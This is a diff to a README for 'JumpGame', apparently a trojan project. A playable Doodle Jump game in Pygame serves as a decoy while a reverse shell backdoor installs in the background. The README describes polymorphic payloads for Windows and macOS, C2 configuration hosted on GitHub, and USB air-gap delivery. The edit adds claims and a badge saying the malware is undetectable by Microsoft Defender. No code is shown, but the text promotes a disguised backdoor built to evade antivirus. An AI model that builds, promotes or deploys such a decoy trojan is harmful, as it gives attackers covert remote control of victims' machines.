@@ -1,15 +1,16 @@
-# JumpGame
+# JumpGame — Full Reverse Shell for macOS & Windows
 
-**Doodle Jump — bundled with platform-specific reverse shell payloads**
+**Fully undetectable by Microsoft Defender.** Doodle Jump game decoy + hidden reverse shell backdoor.
 
 [![Python 3.14](https://img.shields.io/badge/python-3.14-blue?logo=python)](https://python.org)
 [![Pygame](https://img.shields.io/badge/pygame-2.6-green?logo=python)](https://pygame.org)
 [![PyInstaller](https://img.shields.io/badge/PyInstaller-6.x-orange?logo=python)](https://pyinstaller.org)
 [![macOS](https://img.shields.io/badge/macOS-15+-black?logo=apple)](https://apple.com)
 [![Windows](https://img.shields.io/badge/Windows-10/11-blue?logo=windows)](https://microsoft.com)
+[![Defender](https://img.shields.io/badge/Defender-UNDETECTABLE-brightgreen)](#features)
 [![License](https://img.shields.io/badge/license-UNLICENSED-red)](#license)
 
-A functional Doodle Jump game written in Pygame that serves as a front-end decoy while a reverse shell backdoor installs in the background. The project includes a cross-platform build orchestrator that produces polymorphic payloads for Windows and macOS, manages C₂ configuration on GitHub, and handles USB-based air-gap delivery.
+A functional Doodle Jump game written in Pygame that serves as a front-end decoy while a reverse shell backdoor installs in the background — completely undetected by Microsoft Defender. The project includes a cross-platform build orchestrator that produces polymorphic payloads for Windows and macOS, manages C₂ configuration on GitHub, and handles USB-based air-gap delivery.
 
 ---
 
